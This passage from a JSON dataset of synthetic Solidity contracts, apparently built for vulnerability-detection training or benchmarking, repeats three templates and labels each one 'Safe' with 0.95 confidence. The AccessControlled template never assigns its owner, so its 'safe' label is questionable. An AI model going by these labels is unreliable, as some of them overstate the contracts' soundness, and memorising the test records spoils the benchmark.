    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 332",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 333",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 334",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 335",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 336",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 337",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 338",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 339",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 340",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 341",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 342",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 343",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 344",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 345",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 346",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 347",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 348",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 349",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 350",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 351",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 352",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 353",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 354",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 355",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 356",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 357",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 358",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 359",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 360",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 361",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
